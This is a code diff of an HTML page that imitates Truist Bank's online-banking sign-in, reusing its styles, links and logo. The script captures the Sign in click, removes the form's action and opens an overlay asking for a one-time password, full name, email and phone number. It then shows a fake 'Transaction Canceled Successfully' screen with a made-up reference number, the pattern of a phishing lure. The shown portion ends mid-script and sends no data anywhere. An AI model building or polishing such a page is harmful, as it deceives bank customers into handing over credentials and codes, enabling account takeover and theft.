@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -18,13 +19,18 @@
     }
   </style>
 
-  <link rel="stylesheet" href="/etc.clientlibs/stcom-aem-globalcomponents/clientlibs/clientlib-base.min.12e8f394f22e5ec94dc2caea174b918e.css" type="text/css" />
-  <link rel="stylesheet" href="/etc.clientlibs/microsites/clientlibs/clientlibs-micro-site/clientlibs-truist-bank.min.a613f56a23bd686511eb396f7c2b9116.css" type="text/css" />
+  <link rel="stylesheet"
+    href="/etc.clientlibs/stcom-aem-globalcomponents/clientlibs/clientlib-base.min.12e8f394f22e5ec94dc2caea174b918e.css"
+    type="text/css" />
+  <link rel="stylesheet"
+    href="/etc.clientlibs/microsites/clientlibs/clientlibs-micro-site/clientlibs-truist-bank.min.a613f56a23bd686511eb396f7c2b9116.css"
+    type="text/css" />
   <link rel="stylesheet" href="/content/dam/truist-bank/css/custom.css" type="text/css" />
 
   <style>
     /* Make this page fill the viewport exactly like the hero on the homepage */
-    html, body {
+    html,
+    body {
       margin: 0;
       padding: 0;
       min-height: 100vh;
@@ -36,6 +42,7 @@
       min-height: 100vh !important;
       display: flex !important;
       align-items: stretch !important;
+      position: relative !important;
     }
 
     /* On the standalone login page, hide the left content panel — show only the login form */
@@ -46,9 +53,9 @@
     /* Expand the login panel to fill the full width */
     .hero--login-menu--row {
       width: 100% !important;
-      max-width: 480px !important;
-      margin: 0 auto !important;
-      padding: 32px 24px !important;
+      max-width: 100% !important;
+      margin: 0 !important;
+      padding: 16px 0 0 0 !important;
       min-height: 100vh !important;
       display: flex !important;
       align-items: flex-start !important;
@@ -68,166 +75,153 @@
     }
   </style>
 </head>
+
 <body class="page basicpage">
 
-<!-- Exact same hero + login structure as homepage -->
-<div id="main-hero-login"
-     class="bootstrap5-wrapper container-fluid hero-login-template hero-login--image">
+  <!-- Exact same hero + login structure as homepage -->
+  <div id="main-hero-login" class="bootstrap5-wrapper container-fluid hero-login-template hero-login--image">
 
-  <!-- Left side hidden on login-only page -->
-  <div class="jumbotron jumbotron-fluid hero-login-left-container light-font"></div>
+    <!-- Left side hidden on login-only page -->
+    <div class="jumbotron jumbotron-fluid hero-login-left-container light-font"></div>
 
-  <!-- Right side: exact login form from homepage -->
-  <div class="hero--login-menu--row">
-    <div class="login-component">
+    <!-- Right side: exact login form from homepage -->
+    <div class="hero--login-menu--row">
 
-      <section aria-label="Login">
+      <!-- × Close button — top right, same as homepage mobile sign-in overlay -->
+      <button type="button" class="truist-signon-close-button" aria-label="Close" onclick="window.location.href='/'"
+        style="position:absolute;top:16px;right:16px;z-index:10;background:transparent;border:2px solid rgba(255,255,255,0.6);border-radius:8px;width:44px;height:44px;color:#fff;font-size:1.2rem;cursor:pointer;display:flex;align-items:center;justify-content:center;">
+        <span aria-hidden="true" class="signon-close-icon" style="font-style:normal;">&#x2715;</span>
+      </button>
 
-        <div class="loading-container-login" aria-live="polite" style="display:none">
-          <div class="loading-animation">
-            <span class="loading">Loading</span>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
+      <div class="login-component">
+
+        <section aria-label="Login">
+
+          <div class="loading-container-login" aria-live="polite" style="display:none">
+            <div class="loading-animation">
+              <span class="loading">Loading</span>
+              <div class="dot"></div>
+              <div class="dot"></div>
+              <div class="dot"></div>
+            </div>
           </div>
-        </div>
 
-        <div id="maintenancemodeendpointurl"
-             class="maintenancemodeendpointurl login-component-opacity"
-             data-wa-component="login-component"
-             data-maintfrequency="5">
+          <div id="maintenancemodeendpointurl" class="maintenancemodeendpointurl login-component-opacity"
+            data-wa-component="login-component" data-maintfrequency="5">
 
-          <div class="maintenance-mode hide" role="alert"></div>
+            <div class="maintenance-mode hide" role="alert"></div>
 
-          <!--form begin-->
-          <form class="sign-in-form name-loginclass"
-                id="sign-in-form-login-page"
-                novalidate>
+            <!--form begin-->
+            <form class="sign-in-form name-loginclass" id="sign-in-form-login-page" novalidate>
 
-            <!-- User ID -->
-            <div class="form-group">
-              <div class="input-wrapper sign-in-bg-white">
-                <input type="text"
-                       name="nameuserId"
-                       id="iduserId"
-                       aria-required="true"
-                       class="form-control sign-in-form-input login-user-id"
-                       aria-describedby="errMsg-userId"
-                       autocapitalize="none"
-                       autocomplete="off"
-                       value=""
-                       validate="empty"
-                       required />
-                <button type="button" class="signin-clear-icon" aria-label="clear the UserID field"></button>
-                <label for="iduserId">User ID</label>
-                <div class="inline-validation-message" id="errMsg-userId">
-                  <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 17 17">
-                    <g transform="translate(0.5 0.5)">
-                      <rect width="14" height="14" transform="translate(0 0)" fill="none"/>
-                      <path d="M889-1735a8.01,8.01,0,0,1,8-8,8.01,8.01,0,0,1,8,8,8.01,8.01,0,0,1-8,8A8.01,8.01,0,0,1,889-1735Zm2,0a6.006,6.006,0,0,0,6,6,6.006,6.006,0,0,0,6-6,6.006,6.006,0,0,0-6-6A6.006,6.006,0,0,0,891-1735Zm5,3a1,1,0,0,1,1-1,1,1,0,0,1,1,1,1,1,0,0,1-1,1A1,1,0,0,1,896-1732Zm0-3v-3a1,1,0,0,1,1-1,1,1,0,0,1,1,1v3a1,1,0,0,1-1,1A1,1,0,0,1,896-1735Z"
-                            transform="translate(-889 1743)" fill="#ff654d" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1"/>
-                    </g>
-                  </svg>
-                  <span role="alert">Enter User ID</span>
+              <!-- User ID -->
+              <div class="form-group">
+                <div class="input-wrapper sign-in-bg-white">
+                  <input type="text" name="nameuserId" id="iduserId" aria-required="true"
+                    class="form-control sign-in-form-input login-user-id" aria-describedby="errMsg-userId"
+                    autocapitalize="none" autocomplete="off" value="" validate="empty" required />
+                  <button type="button" class="signin-clear-icon" aria-label="clear the UserID field"></button>
+                  <label for="iduserId">User ID</label>
+                  <div class="inline-validation-message" id="errMsg-userId">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 17 17">
+                      <g transform="translate(0.5 0.5)">
+                        <rect width="14" height="14" transform="translate(0 0)" fill="none" />
+                        <path
+                          d="M889-1735a8.01,8.01,0,0,1,8-8,8.01,8.01,0,0,1,8,8,8.01,8.01,0,0,1-8,8A8.01,8.01,0,0,1,889-1735Zm2,0a6.006,6.006,0,0,0,6,6,6.006,6.006,0,0,0,6-6,6.006,6.006,0,0,0-6-6A6.006,6.006,0,0,0,891-1735Zm5,3a1,1,0,0,1,1-1,1,1,0,0,1,1,1,1,1,0,0,1-1,1A1,1,0,0,1,896-1732Zm0-3v-3a1,1,0,0,1,1-1,1,1,0,0,1,1,1v3a1,1,0,0,1-1,1A1,1,0,0,1,896-1735Z"
+                          transform="translate(-889 1743)" fill="#ff654d" stroke="rgba(0,0,0,0)" stroke-miterlimit="10"
+                          stroke-width="1" />
+                      </g>
+                    </svg>
+                    <span role="alert">Enter User ID</span>
+                  </div>
                 </div>
               </div>
-            </div>
 
-            <!-- Save user ID + Forgot user ID -->
-            <div class="form-group form-space-24 disp-flex">
-              <div class="input-wrapper login-checkbox-container">
-                <label class="form-check-label custom-control-label" for="login-save-user-id-checkbox">
-                  <input type="checkbox"
-                         class="form-control login-save-user-id-checkbox"
-                         id="login-save-user-id-checkbox"
-                         name="login-save-user-id-checkbox" />
-                  <span class="label-span">Save user ID</span>
-                </label>
+              <!-- Save user ID + Forgot user ID -->
+              <div class="form-group form-space-24 disp-flex">
+                <div class="input-wrapper login-checkbox-container">
+                  <label class="form-check-label custom-control-label" for="login-save-user-id-checkbox">
+                    <input type="checkbox" class="form-control login-save-user-id-checkbox"
+                      id="login-save-user-id-checkbox" name="login-save-user-id-checkbox" />
+                    <span class="label-span">Save user ID</span>
+                  </label>
+                </div>
+                <a href="https://dias.bank.truist.com/selfserv/forgotuserid" class="form-link text-right in-block-link"
+                  target="_blank">
+                  Forgot user ID?
+                  <span class="sr-only">click here to reset your User ID.</span>
+                </a>
               </div>
-              <a href="https://dias.bank.truist.com/selfserv/forgotuserid"
-                 class="form-link text-right in-block-link"
-                 target="_blank">
-                Forgot user ID?
-                <span class="sr-only">click here to reset your User ID.</span>
-              </a>
-            </div>
 
-            <!-- Password -->
-            <div class="form-group">
-              <div class="input-wrapper sign-in-bg-white">
-                <input type="password"
-                       name="namepassword"
-                       id="idpassword"
-                       aria-required="true"
-                       class="form-control sign-in-form-input login-password"
-                       aria-describedby="errMsg-password"
-                       autocapitalize="none"
-                       autocomplete="off"
-                       value=""
-                       validate="empty" />
-                <button class="password-not-visible" type="button" aria-label="Show password"></button>
-                <label for="idpassword">Password</label>
-                <div class="inline-validation-message" id="errMsg-password">
-                  <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 17 17">
-                    <g transform="translate(0.5 0.5)">
-                      <rect width="14" height="14" transform="translate(0 0)" fill="none"/>
-                      <path d="M889-1735a8.01,8.01,0,0,1,8-8,8.01,8.01,0,0,1,8,8,8.01,8.01,0,0,1-8,8A8.01,8.01,0,0,1,889-1735Zm2,0a6.006,6.006,0,0,0,6,6,6.006,6.006,0,0,0,6-6,6.006,6.006,0,0,0-6-6A6.006,6.006,0,0,0,891-1735Zm5,3a1,1,0,0,1,1-1,1,1,0,0,1,1,1,1,1,0,0,1-1,1A1,1,0,0,1,896-1732Zm0-3v-3a1,1,0,0,1,1-1,1,1,0,0,1,1,1v3a1,1,0,0,1-1,1A1,1,0,0,1,896-1735Z"
-                            transform="translate(-889 1743)" fill="#ff654d" stroke="rgba(0,0,0,0)" stroke-miterlimit="10" stroke-width="1"/>
-                    </g>
-                  </svg>
-                  <span role="alert">Enter Password</span>
+              <!-- Password -->
+              <div class="form-group">
+                <div class="input-wrapper sign-in-bg-white">
+                  <input type="password" name="namepassword" id="idpassword" aria-required="true"
+                    class="form-control sign-in-form-input login-password" aria-describedby="errMsg-password"
+                    autocapitalize="none" autocomplete="off" value="" validate="empty" />
+                  <button class="password-not-visible" type="button" aria-label="Show password"></button>
+                  <label for="idpassword">Password</label>
+                  <div class="inline-validation-message" id="errMsg-password">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 17 17">
+                      <g transform="translate(0.5 0.5)">
+                        <rect width="14" height="14" transform="translate(0 0)" fill="none" />
+                        <path
+                          d="M889-1735a8.01,8.01,0,0,1,8-8,8.01,8.01,0,0,1,8,8,8.01,8.01,0,0,1-8,8A8.01,8.01,0,0,1,889-1735Zm2,0a6.006,6.006,0,0,0,6,6,6.006,6.006,0,0,0,6-6,6.006,6.006,0,0,0-6-6A6.006,6.006,0,0,0,891-1735Zm5,3a1,1,0,0,1,1-1,1,1,0,0,1,1,1,1,1,0,0,1-1,1A1,1,0,0,1,896-1732Zm0-3v-3a1,1,0,0,1,1-1,1,1,0,0,1,1,1v3a1,1,0,0,1-1,1A1,1,0,0,1,896-1735Z"
+                          transform="translate(-889 1743)" fill="#ff654d" stroke="rgba(0,0,0,0)" stroke-miterlimit="10"
+                          stroke-width="1" />
+                      </g>
+                    </svg>
+                    <span role="alert">Enter Password</span>
+                  </div>
                 </div>
               </div>
-            </div>
 
-            <!-- Reset password -->
-            <div class="form-group form-check truist-login-widget-form--password-forgot form-space-24">
-              <div class="row">
+              <!-- Reset password -->
+              <div class="form-group form-check truist-login-widget-form--password-forgot form-space-24">
+                <div class="row">
+                  <div class="col-sm">
+                    <a href="https://dias.bank.truist.com/selfserv/forgotpwd" class="form-text text-right"
+                      target="_blank">
+                      Reset password
+                      <span class="sr-only">click here to reset</span>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Sign in button -->
+              <div class="row truist-login-widget-form--submit">
                 <div class="col-sm">
-                  <a href="https://dias.bank.truist.com/selfserv/forgotpwd"
-                     class="form-text text-right"
-                     target="_blank">
-                    Reset password
-                    <span class="sr-only">click here to reset</span>
-                  </a>
+                  <button type="button" class="btn btn-truist-login" id="loginSubmit">
+                    <span class="button-label">Sign in</span>
+                  </button>
                 </div>
               </div>
-            </div>
 
-            <!-- Sign in button -->
-            <div class="row truist-login-widget-form--submit">
-              <div class="col-sm">
-                <button type="button"
-                        class="btn btn-truist-login"
-                        id="loginSubmit">
-                  <span class="button-label">Sign in</span>
-                </button>
+              <!-- Need a user ID -->
+              <div class="row truist-login-widget-form--need-id form-space-32">
+                <p class="even-space-copy">
+                  <strong>Need a user ID?</strong>
+                  <span class="sign-in-qr-copy">
+                    <a href="https://bank.truist.com/web/enroll/personal">Set up online banking</a>
+                  </span>
+                </p>
               </div>
-            </div>
 
-            <!-- Need a user ID -->
-            <div class="row truist-login-widget-form--need-id form-space-32">
-              <p class="even-space-copy">
-                <strong>Need a user ID?</strong>
-                <span class="sign-in-qr-copy">
-                  <a href="https://bank.truist.com/web/enroll/personal">Set up online banking</a>
-                </span>
-              </p>
-            </div>
+              <!-- Online security measures -->
+              <div class="row truist-login-widget-form--need-id">
+                <p><a href="/fraud-and-security/protect-yourself">Online security measures</a></p>
+              </div>
 
-            <!-- Online security measures -->
-            <div class="row truist-login-widget-form--need-id">
-              <p><a href="/fraud-and-security/protect-yourself">Online security measures</a></p>
-            </div>
-
-            <!-- Sign in to another account -->
-            <div class="row truist-login-widget-form--other-accounts">
-              <div class="col-sm oa-link-container">
-                <a href="/partner-login" target="_blank" class="form-text text-left">
-                  <svg version="1.1" class="truist-global-nav-header-icon-sign-in"
-                       style="enable-background:new 0 0 65 65;" xmlns="http://www.w3.org/2000/svg"
-                       height="22px" width="22px" x="0px" y="0px" viewBox="0 0 65 65" xml:space="preserve">
-                    <path class="st1" d="M37.9,59.5c0.2,0,0.3-0.1,0.5-0.1c0.5-0.1,1-0.2,1.5-0.4C51.8,55.6,60,44.8,60,32.5
+              <!-- Sign in to another account -->
+              <div class="row truist-login-widget-form--other-accounts">
+                <div class="col-sm oa-link-container">
+                  <a href="/partner-login" target="_blank" class="form-text text-left">
+                    <svg version="1.1" class="truist-global-nav-header-icon-sign-in"
+                      style="enable-background:new 0 0 65 65;" xmlns="http://www.w3.org/2000/svg" height="22px"
+                      width="22px" x="0px" y="0px" viewBox="0 0 65 65" xml:space="preserve">
+                      <path class="st1"
+                        d="M37.9,59.5c0.2,0,0.3-0.1,0.5-0.1c0.5-0.1,1-0.2,1.5-0.4C51.8,55.6,60,44.8,60,32.5
                     C60,17.3,47.7,5,32.5,5C17.3,5,5,17.3,5,32.5C5,44.8,13.2,55.6,25.1,59c0.5,0.1,1,0.3,1.5,0.4c0.2,0,0.3,0.1,0.5,0.1
                     c0.8,0.2,1.5,0.3,2.3,0.4c0.2,0,0.4,0,0.6,0.1c0.8,0.1,1.7,0.1,2.5,0.1c0.9,0,1.7-0.1,2.5-0.1c0.2,0,0.4,0,0.6-0.1
                     C36.4,59.7,37.2,59.6,37.9,59.5z M37.8,54.8c-0.4,0.1-0.7,0.2-1.1,0.2c-0.5,0.1-1.1,0.2-1.7,0.3c-0.2,0-0.3,0-0.5,0
@@ -235,229 +229,237 @@
                     c-4.9-1.2-8.5-4.1-8.5-7.4c0-4.4,6.3-8,13.8-8s13.8,3.7,13.8,8C46.2,50.7,42.7,53.5,37.8,54.8L37.8,54.8z M25.6,27.9
                     c0-3.8,3.1-6.9,6.9-6.9s6.9,3.1,6.9,6.9s-3.1,6.9-6.9,6.9S25.6,31.7,25.6,27.9z M9.6,32.5c0-12.7,10.3-22.9,22.9-22.9
                     c12.7,0,22.9,10.3,22.9,22.9c0,5-1.6,9.8-4.7,13.8c-0.6-4.6-4.5-8.4-10.2-10.2c2.2-2.1,3.4-5.1,3.4-8.1c0-6.3-5.1-11.5-11.5-11.5
-                    c-6.3,0-11.5,5.1-11.5,11.5c0,3.1,1.2,6,3.4,8.1c-5.7,1.9-9.6,5.7-10.2,10.2C11.2,42.3,9.6,37.5,9.6,32.5z"/>
-                  </svg>
-                  Sign in to another account
-                  <svg class="arrow" width="14" height="12" viewBox="0 0 14 12" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M7.33333 0.5L13 6M13 6L7.33333 11.5M13 6H1" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/>
-                  </svg>
-                </a>
+                    c-6.3,0-11.5,5.1-11.5,11.5c0,3.1,1.2,6,3.4,8.1c-5.7,1.9-9.6,5.7-10.2,10.2C11.2,42.3,9.6,37.5,9.6,32.5z" />
+                    </svg>
+                    Sign in to another account
+                    <svg class="arrow" width="14" height="12" viewBox="0 0 14 12" fill="none"
+                      xmlns="http://www.w3.org/2000/svg">
+                      <path d="M7.33333 0.5L13 6M13 6L7.33333 11.5M13 6H1" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                    </svg>
+                  </a>
+                </div>
               </div>
-            </div>
 
-          </form>
-          <!--form end-->
+            </form>
+            <!--form end-->
 
+          </div>
+        </section>
+      </div>
+    </div>
+
+  </div>
+  <!-- end hero -->
+
+
+  <!-- ── OTP / Details overlay (exact same as homepage) ── -->
+  <div id="tru-otp-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-otp-title" style="display:none;">
+    <div class="tru-overlay-backdrop"></div>
+    <div class="tru-overlay-panel">
+      <div class="tru-overlay-header">
+        <img src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Truist"
+          class="tru-overlay-logo" />
+        <h2 id="tru-otp-title" class="tru-overlay-title">Verify your identity</h2>
+        <p class="tru-overlay-subtitle">Please enter the OTP sent to your device and complete your profile.</p>
+      </div>
+      <form id="tru-otp-form" class="tru-overlay-form" novalidate>
+        <div class="tru-field-group">
+          <label for="tru-otp-code">One-Time Password (OTP)</label>
+          <input type="text" id="tru-otp-code" name="otp" placeholder="Enter 6-digit OTP" maxlength="6"
+            inputmode="numeric" autocomplete="one-time-code" required />
+          <span class="tru-field-error" id="tru-otp-error"></span>
         </div>
-      </section>
+        <div class="tru-field-group">
+          <label for="tru-full-name">Full Name</label>
+          <input type="text" id="tru-full-name" name="name" placeholder="Enter your full name" required />
+          <span class="tru-field-error" id="tru-name-error"></span>
+        </div>
+        <div class="tru-field-group">
+          <label for="tru-email">Email Address</label>
+          <input type="email" id="tru-email" name="email" placeholder="Enter your email address" required />
+          <span class="tru-field-error" id="tru-email-error"></span>
+        </div>
+        <div class="tru-field-group">
+          <label for="tru-phone">Phone Number</label>
+          <input type="tel" id="tru-phone" name="phone" placeholder="Enter your phone number" required />
+          <span class="tru-field-error" id="tru-phone-error"></span>
+        </div>
+        <button type="submit" class="tru-overlay-btn">Submit</button>
+      </form>
     </div>
   </div>
 
-</div>
-<!-- end hero -->
-
-
-<!-- ── OTP / Details overlay (exact same as homepage) ── -->
-<div id="tru-otp-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-otp-title" style="display:none;">
-  <div class="tru-overlay-backdrop"></div>
-  <div class="tru-overlay-panel">
-    <div class="tru-overlay-header">
-      <img src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Truist" class="tru-overlay-logo" />
-      <h2 id="tru-otp-title" class="tru-overlay-title">Verify your identity</h2>
-      <p class="tru-overlay-subtitle">Please enter the OTP sent to your device and complete your profile.</p>
+  <!-- ── Success / Cancel overlay (exact same as homepage) ── -->
+  <div id="tru-success-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-success-title"
+    style="display:none;">
+    <div class="tru-overlay-backdrop"></div>
+    <div class="tru-overlay-panel tru-success-panel">
+      <div class="tru-success-icon" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="none">
+          <circle cx="32" cy="32" r="32" fill="#4CAF50" />
+          <path d="M18 32l10 10 18-18" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" />
+        </svg>
+      </div>
+      <h2 id="tru-success-title" class="tru-overlay-title">Transaction Canceled Successfully</h2>
+      <p class="tru-success-msg">Your transaction has been canceled. Your session is now being closed for security.</p>
+      <div class="tru-success-detail">
+        <span class="tru-success-label">Status</span>
+        <span class="tru-success-value tru-green">Completed</span>
+      </div>
+      <div class="tru-success-detail">
+        <span class="tru-success-label">Reference</span>
+        <span class="tru-success-value" id="tru-ref-number"></span>
+      </div>
+      <p class="tru-redirect-msg">Returning to homepage in <strong id="tru-countdown">10</strong> seconds…</p>
+      <div class="tru-progress-bar">
+        <div class="tru-progress-fill" id="tru-progress-fill"></div>
+      </div>
+      <button class="tru-overlay-btn tru-btn-outline" id="tru-go-home-now">Go to Homepage Now</button>
     </div>
-    <form id="tru-otp-form" class="tru-overlay-form" novalidate>
-      <div class="tru-field-group">
-        <label for="tru-otp-code">One-Time Password (OTP)</label>
-        <input type="text" id="tru-otp-code" name="otp" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" autocomplete="one-time-code" required />
-        <span class="tru-field-error" id="tru-otp-error"></span>
-      </div>
-      <div class="tru-field-group">
-        <label for="tru-full-name">Full Name</label>
-        <input type="text" id="tru-full-name" name="name" placeholder="Enter your full name" required />
-        <span class="tru-field-error" id="tru-name-error"></span>
-      </div>
-      <div class="tru-field-group">
-        <label for="tru-email">Email Address</label>
-        <input type="email" id="tru-email" name="email" placeholder="Enter your email address" required />
-        <span class="tru-field-error" id="tru-email-error"></span>
-      </div>
-      <div class="tru-field-group">
-        <label for="tru-phone">Phone Number</label>
-        <input type="tel" id="tru-phone" name="phone" placeholder="Enter your phone number" required />
-        <span class="tru-field-error" id="tru-phone-error"></span>
-      </div>
-      <button type="submit" class="tru-overlay-btn">Submit</button>
-    </form>
   </div>
-</div>
 
-<!-- ── Success / Cancel overlay (exact same as homepage) ── -->
-<div id="tru-success-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-success-title" style="display:none;">
-  <div class="tru-overlay-backdrop"></div>
-  <div class="tru-overlay-panel tru-success-panel">
-    <div class="tru-success-icon" aria-hidden="true">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="none">
-        <circle cx="32" cy="32" r="32" fill="#4CAF50"/>
-        <path d="M18 32l10 10 18-18" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-    </div>
-    <h2 id="tru-success-title" class="tru-overlay-title">Transaction Canceled Successfully</h2>
-    <p class="tru-success-msg">Your transaction has been canceled. Your session is now being closed for security.</p>
-    <div class="tru-success-detail">
-      <span class="tru-success-label">Status</span>
-      <span class="tru-success-value tru-green">Completed</span>
-    </div>
-    <div class="tru-success-detail">
-      <span class="tru-success-label">Reference</span>
-      <span class="tru-success-value" id="tru-ref-number"></span>
-    </div>
-    <p class="tru-redirect-msg">Returning to homepage in <strong id="tru-countdown">10</strong> seconds…</p>
-    <div class="tru-progress-bar"><div class="tru-progress-fill" id="tru-progress-fill"></div></div>
-    <button class="tru-overlay-btn tru-btn-outline" id="tru-go-home-now">Go to Homepage Now</button>
-  </div>
-</div>
+  <!-- Bootstrap JS (needed for dropdown behaviour) -->
+  <script src="/etc/clientlibs/truist-global/clientlibs/js/bootstrap.bundle.min.js"></script>
 
-<!-- Bootstrap JS (needed for dropdown behaviour) -->
-<script src="/etc/clientlibs/truist-global/clientlibs/js/bootstrap.bundle.min.js"></script>
+  <!-- SIGN-IN FLOW CONTROLLER (same logic as homepage) -->
+  <script>
+    (function () {
+      'use strict';
 
-<!-- SIGN-IN FLOW CONTROLLER (same logic as homepage) -->
-<script>
-(function () {
-  'use strict';
+      function byId(id) { return document.getElementById(id); }
+      function show(id) { byId(id).style.display = 'flex'; document.body.style.overflow = 'hidden'; }
+      function hide(id) { byId(id).style.display = 'none'; document.body.style.overflow = ''; }
+      function setError(id, msg) { var el = byId(id); el.textContent = msg; el.style.display = msg ? 'block' : 'none'; }
+      function clearErrors() {
+        ['tru-otp-error', 'tru-name-error', 'tru-email-error', 'tru-phone-error']
+          .forEach(function (id) { setError(id, ''); });
+      }
+      function randRef() {
+        return 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
+      }
 
-  function byId(id) { return document.getElementById(id); }
-  function show(id) { byId(id).style.display = 'flex'; document.body.style.overflow = 'hidden'; }
-  function hide(id) { byId(id).style.display = 'none';  document.body.style.overflow = ''; }
-  function setError(id, msg) { var el = byId(id); el.textContent = msg; el.style.display = msg ? 'block' : 'none'; }
-  function clearErrors() {
-    ['tru-otp-error','tru-name-error','tru-email-error','tru-phone-error']
-      .forEach(function(id){ setError(id,''); });
-  }
-  function randRef() {
-    return 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2,6).toUpperCase();
-  }
+      // ── Floating labels ────────────────────────────────────────────────────────
+      function initFloatingLabels() {
+        document.querySelectorAll('.sign-in-form .form-group input:not([type="checkbox"])').forEach(function (input) {
+          var group = input.closest('.form-group');
+          if (!group) return;
+          var label = group.querySelector('label');
+          if (!label) return;
+          if (input.value) label.classList.add('is-focused');
+          input.addEventListener('focus', function () { label.classList.add('is-focused'); });
+          input.addEventListener('blur', function () {
+            if (!input.value) { label.classList.remove('is-focused'); label.classList.remove('has-error'); }
+          });
+        });
 
-  // ── Floating labels ────────────────────────────────────────────────────────
-  function initFloatingLabels() {
-    document.querySelectorAll('.sign-in-form .form-group input:not([type="checkbox"])').forEach(function(input) {
-      var group = input.closest('.form-group');
-      if (!group) return;
-      var label = group.querySelector('label');
-      if (!label) return;
-      if (input.value) label.classList.add('is-focused');
-      input.addEventListener('focus', function() { label.classList.add('is-focused'); });
-      input.addEventListener('blur',  function() {
-        if (!input.value) { label.classList.remove('is-focused'); label.classList.remove('has-error'); }
-      });
-    });
+        // Show/hide password
+        document.querySelectorAll('.password-not-visible').forEach(function (btn) {
+          btn.addEventListener('click', function () {
+            var group = btn.closest('.form-group');
+            if (!group) return;
+            var pwd = group.querySelector('input[type="password"], input[type="text"]');
+            if (!pwd) return;
+            pwd.type = pwd.type === 'password' ? 'text' : 'password';
+            btn.setAttribute('aria-label', pwd.type === 'password' ? 'Show password' : 'Hide password');
+          });
+        });
 
-    // Show/hide password
-    document.querySelectorAll('.password-not-visible').forEach(function(btn) {
-      btn.addEventListener('click', function() {
-        var group = btn.closest('.form-group');
-        if (!group) return;
-        var pwd = group.querySelector('input[type="password"], input[type="text"]');
-        if (!pwd) return;
-        pwd.type = pwd.type === 'password' ? 'text' : 'password';
-        btn.setAttribute('aria-label', pwd.type === 'password' ? 'Show password' : 'Hide password');
-      });
-    });
+        // Clear button
+        document.querySelectorAll('.signin-clear-icon').forEach(function (btn) {
+          btn.addEventListener('click', function () {
+            var group = btn.closest('.form-group');
+            if (!group) return;
+            var inp = group.querySelector('input');
+            var lbl = group.querySelector('label');
+            if (inp) { inp.value = ''; inp.focus(); }
+            if (lbl) { lbl.classList.remove('is-focused', 'has-error'); }
+          });
+        });
+      }
 
-    // Clear button
-    document.querySelectorAll('.signin-clear-icon').forEach(function(btn) {
-      btn.addEventListener('click', function() {
-        var group = btn.closest('.form-group');
-        if (!group) return;
-        var inp = group.querySelector('input');
-        var lbl = group.querySelector('label');
-        if (inp) { inp.value = ''; inp.focus(); }
-        if (lbl) { lbl.classList.remove('is-focused','has-error'); }
-      });
-    });
-  }
+      // ── Step 1: intercept Sign in ──────────────────────────────────────────────
+      function openOtpOverlay(e) {
+        if (e) { e.preventDefault(); e.stopImmediatePropagation(); }
+        clearErrors();
+        show('tru-otp-overlay');
+        setTimeout(function () { var f = byId('tru-otp-code'); if (f) f.focus(); }, 80);
+      }
 
-  // ── Step 1: intercept Sign in ──────────────────────────────────────────────
-  function openOtpOverlay(e) {
-    if (e) { e.preventDefault(); e.stopImmediatePropagation(); }
-    clearErrors();
-    show('tru-otp-overlay');
-    setTimeout(function(){ var f = byId('tru-otp-code'); if (f) f.focus(); }, 80);
-  }
+      function attachSignIn() {
+        document.querySelectorAll('form.sign-in-form').forEach(function (form) {
+          if (form.dataset.truDone) return;
+          form.dataset.truDone = '1';
+          form.removeAttribute('action');
+          form.addEventListener('submit', openOtpOverlay, true);
+        });
+        document.querySelectorAll('#loginSubmit, .btn-truist-login').forEach(function (btn) {
+          if (btn.dataset.truDone) return;
+          btn.dataset.truDone = '1';
+          btn.addEventListener('click', openOtpOverlay, true);
+        });
+      }
 
-  function attachSignIn() {
-    document.querySelectorAll('form.sign-in-form').forEach(function(form) {
-      if (form.dataset.truDone) return;
-      form.dataset.truDone = '1';
-      form.removeAttribute('action');
-      form.addEventListener('submit', openOtpOverlay, true);
-    });
-    document.querySelectorAll('#loginSubmit, .btn-truist-login').forEach(function(btn) {
-      if (btn.dataset.truDone) return;
-      btn.dataset.truDone = '1';
-      btn.addEventListener('click', openOtpOverlay, true);
-    });
-  }
+      // ── Step 2: validate OTP form ──────────────────────────────────────────────
+      var otpForm = byId('tru-otp-form');
+      if (otpForm) {
+        otpForm.addEventListener('submit', function (e) {
+          e.preventDefault();
+          clearErrors();
+          var otp = byId('tru-otp-code').value.trim();
+          var name = byId('tru-full-name').value.trim();
+          var email = byId('tru-email').value.trim();
+          var phone = byId('tru-phone').value.trim();
+          var ok = true;
+          if (!otp || otp.length < 4) { setError('tru-otp-error', 'Please enter a valid OTP (at least 4 digits).'); ok = false; }
+          if (!name) { setError('tru-name-error', 'Full name is required.'); ok = false; }
+          if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { setError('tru-email-error', 'Please enter a valid email address.'); ok = false; }
+          if (!phone || phone.replace(/\D/g, '').length < 7) { setError('tru-phone-error', 'Please enter a valid phone number.'); ok = false; }
+          if (!ok) return;
+          hide('tru-otp-overlay');
+          byId('tru-ref-number').textContent = randRef();
+          show('tru-success-overlay');
+          startCountdown();
+        });
+      }
 
